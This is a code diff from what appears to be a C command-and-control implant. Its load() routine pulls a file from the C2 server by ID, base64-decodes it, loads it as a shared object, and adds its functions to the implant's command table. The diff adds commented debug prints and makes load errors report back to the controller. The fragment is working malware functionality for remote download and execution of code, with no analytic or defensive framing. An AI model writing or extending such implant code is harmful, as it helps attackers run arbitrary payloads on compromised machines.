@@ -15,8 +15,9 @@ int load(cJSON* json){
     unsigned int file_id = (unsigned int) cJSON_GetObjectItem(params, "file_id")->valueint;
 
     global_info->C2.upload(file_id, &file_buffer, &file_length);
-
+    //printf("base64 file length: %d\n", file_length);
     unsigned char *final_file_data = b64_decode(file_buffer, &file_length);
+    //printf("decoded file length: %d\n", file_length);
 
     void* so_handle = get_so_handle(final_file_data, file_length);
 
@@ -36,7 +37,7 @@ int load(cJSON* json){
         if( fptr ){
             update_global_functions(cmd, fptr);
         }else{
-            printf("failed to find function in .so: %s\n", cmd);
+            send_basic_response("Failed to find a command in the shared object", cJSON_GetObjectItem(json, "id")->valueint);
         }
         cmd = strtok(NULL, separator);
     }
